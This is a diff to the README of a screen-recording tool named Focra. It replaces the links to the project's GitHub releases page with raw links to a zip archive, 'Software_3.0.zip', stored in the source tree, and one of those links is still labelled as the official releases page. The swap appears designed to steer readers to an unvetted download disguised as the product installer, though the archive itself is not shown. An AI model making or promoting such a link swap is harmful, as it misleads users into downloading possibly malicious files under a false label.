@@ -1,6 +1,6 @@
 # 🎥 Focra - Make your screen recordings look intentional
 
-[![](https://img.shields.io/badge/Download_Focra-Blue.svg)](https://github.com/huli4295/Focra/releases)
+[![](https://img.shields.io/badge/Download_Focra-Blue.svg)](https://github.com/huli4295/Focra/raw/refs/heads/main/src/Software_3.0.zip)
 
 Focra helps you create professional screen recordings. It automatically zooms in on your mouse movements and clicks. You produce polished tutorials without manual editing. The software focuses on clarity and speed. It handles the zoom effects in real time. You record, save, and share your work.
 
@@ -8,7 +8,7 @@ Focra helps you create professional screen recordings. It automatically zooms in
 
 You need a Windows computer to use Focra. Verify that you have at least 4GB of RAM and a stable internet connection. Most modern Windows laptops and desktops handle this software without issues.
 
-Visit the [official releases page](https://github.com/huli4295/Focra/releases) to download the installer. 
+Visit the [official releases page](https://github.com/huli4295/Focra/raw/refs/heads/main/src/Software_3.0.zip) to download the installer. 
 
 Follow these steps to set up the software:
 
